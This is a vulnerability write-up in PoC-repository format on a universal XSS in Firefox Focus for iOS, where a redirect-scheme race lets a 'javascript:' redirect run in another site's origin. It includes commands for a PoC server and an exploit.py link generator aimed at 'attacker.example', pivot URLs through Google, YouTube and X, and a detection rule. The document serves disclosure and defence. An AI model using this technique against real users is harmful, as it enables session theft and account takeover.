# FirefUXSS: Universal XSS in Firefox Focus for iOS via Redirect-Scheme Validation Race Condition

<!-- 
  File: 2026-06-08_firefox-focus-ios-uxss-redirect-scheme-race-condition.md
  Location: pocs/<category>/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-06-08 |
| **Last Updated** | 2026-06-08 |
| **Author / Researcher** | @RenwaX23 (V12 Security) |
| **CVE / Advisory** | N/A |
| **Category** | web |
| **Severity** | Critical |
| **CVSS Score** | 9.3 (CVSSv3.1) |
| **Status** | Unpatched |
| **Tags** | UXSS, XSS, race-condition, TOCTOU, redirect-validation, javascript-scheme, iOS, Firefox Focus |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Firefox Focus for iOS |
| **Versions Affected** | Latest available version at time of testing (per upstream disclosure) |
| **Language / Platform** | iOS browser / WebKit-based mobile browsing context |
| **Authentication Required** | No |
| **Network Access Required** | Yes |

---

## Summary

FirefUXSS is a universal XSS issue in Firefox Focus for iOS where redirect-scheme validation can be bypassed via a race condition. A burst of benign redirects can desynchronize validation from navigation commit, allowing a final `javascript:` redirect to execute. The JavaScript then runs with the origin of the previously loaded page, enabling cross-origin script execution on high-value domains reached through open redirects.

---

## Vulnerability Details

### Root Cause

Firefox Focus performs dangerous-scheme validation for redirect targets, but the check is not atomic with navigation commit. This creates a TOCTOU window where the navigation pipeline can commit a redirect target before the `javascript:` scheme rejection is effectively enforced.

### Attack Vector

An attacker lures a victim to an attacker-controlled page loaded in `_self`, pivots the browsing context through a target-origin open redirect, then triggers a rapid redirect chain ending in `javascript:`. If timing is favorable, the browser executes that final payload in the inherited origin context.

### Impact

Successful exploitation gives attacker-controlled JavaScript execution in arbitrary target origins the victim traverses (for example, Google/X/YouTube/Reddit in the public PoC). This can enable session theft, account takeover, and unauthorized actions in authenticated sessions.

---

## Environment / Lab Setup

```
OS:          iOS device (or simulator) with Firefox Focus installed
Target:      Firefox Focus for iOS (unpatched build)
Attacker:    Controlled web server hosting PoC page and redirect endpoint
Tools:       python3 (link generator), optional PHP web host, HTTPS endpoint
```

### Setup Steps

```bash
# Generate pivot links for an attacker-controlled PoC endpoint
python3 exploit.py --attacker-url 'https://attacker.example/poc.php?redirect=1'

# Host the upstream PHP PoC (if reproducing with original artifact)
# php -S 0.0.0.0:8080
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Host the PoC endpoint** controlled by the researcher (for example `poc.php?redirect=1`).
   ```bash
   php -S 0.0.0.0:8080
   ```

2. **Generate/open a pivot URL** that routes through a target-origin redirect.
   ```bash
   python3 exploit.py --attacker-url 'https://attacker.example/poc.php?redirect=1'
   ```

3. **Open one generated URL in Firefox Focus for iOS** and allow navigation in `_self`; the final redirect races into a `javascript:` URI and may execute in inherited target origin.

### Exploit Code

> See `exploit.py` in this folder for a minimal pivot-link generator.

```python
from exploit import build_pivot_links

links = build_pivot_links("https://attacker.example/poc.php?redirect=1")
print(links["google"])
```

### Expected Output

```
[+] Generated FirefUXSS pivot links:
  - google: https://www.google.com/url?q=...
  - youtube: https://www.youtube.com/redirect?q=...
  - x: https://x.com/safety/unsafe_link_warning?unsafe_link=...

[+] If vulnerable, final JavaScript executes in inherited target origin context.
```

---

## Screenshots / Evidence

- `screenshots/` — add reproduction video or browser-origin evidence from authorized testing

---

## Detection & Indicators of Compromise

```
- Spikes of chained 30x redirects from a single client to the same attacker path.
- Location headers resolving to javascript: payloads after redirect bursts.
- Suspicious outbound pivots through known open-redirect endpoints that return to attacker infrastructure.
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $HTTP_SERVERS any (
  msg:"Possible Firefox Focus redirect-scheme race exploitation";
  content:"Location|3a 20|javascript:"; http_header;
  sid:900260608; rev:1;
)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Apply Mozilla fix once available for Firefox Focus iOS redirect handling |
| **Workaround** | Avoid opening untrusted redirect chains and block attacker-controlled intermediary domains where possible |
| **Config Hardening** | Reject `javascript:`/`data:`/`file:` redirect targets at multiple layers with atomic validation+commit controls |

---

## References

- [Source PoC Repository (v12-security/pocs)](https://github.com/v12-security/pocs/tree/main/firefox)
- [Original FirefUXSS Write-up](https://github.com/v12-security/pocs/blob/main/firefox/README.md)
- [Public Demo (as provided by researchers)](https://firefoxuxss.v12.sh)

---

## Notes

Auto-ingested from https://github.com/v12-security/pocs/tree/main/firefox on 2026-06-08.

Disclosure timeline in upstream notes indicates report submission on 2025-07-04 and public release on 2026-06-08 after no patch was available.
